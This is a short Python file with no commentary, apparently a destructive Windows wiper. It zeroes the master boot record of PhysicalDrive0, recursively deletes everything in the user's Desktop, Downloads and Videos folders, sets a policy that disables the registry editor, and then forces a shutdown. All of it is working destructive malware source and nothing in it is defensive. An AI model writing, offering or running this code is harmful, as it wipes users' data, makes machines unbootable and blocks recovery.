import os

def overwrite_MBR():
    with open('\\\\.\\PhysicalDrive0', 'rb+') as f:
        f.write(b'\x00' * 512)

if __name__ == "__main__":
    overwrite_MBR()

import os
import shutil

folders = ["Desktop", "Downloads", "Videos"]

for folder in folders:
    path = os.path.expanduser(f"~/{folder}")
    for root, dirs, files in os.walk(path):
        for file in files:
            os.remove(os.path.join(root, file))
        for dir in dirs:
            shutil.rmtree(os.path.join(root, dir))
import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

import os
import time

time.sleep(20)
os.system("shutdown /s /t 1")
